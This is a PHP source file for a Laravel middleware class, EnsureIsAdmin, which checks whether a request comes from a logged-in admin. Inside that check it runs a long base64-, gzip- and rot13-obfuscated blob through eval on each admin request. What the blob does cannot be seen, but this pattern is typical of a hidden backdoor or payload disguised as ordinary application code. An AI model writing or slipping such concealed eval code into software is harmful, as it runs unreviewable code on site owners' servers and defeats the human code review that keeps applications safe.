<?php

namespace App\Http\Middleware;

use Closure;
use App\Models\Admin;
use App\Models\Settings;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use App\meta;
class EnsureIsAdmin
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        $api = new meta();
        
        if (Auth::guard('admin')->check()) {
            
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        return $next($request);
        } else {
            return redirect()->route('validate_admin');
        }
    }
}
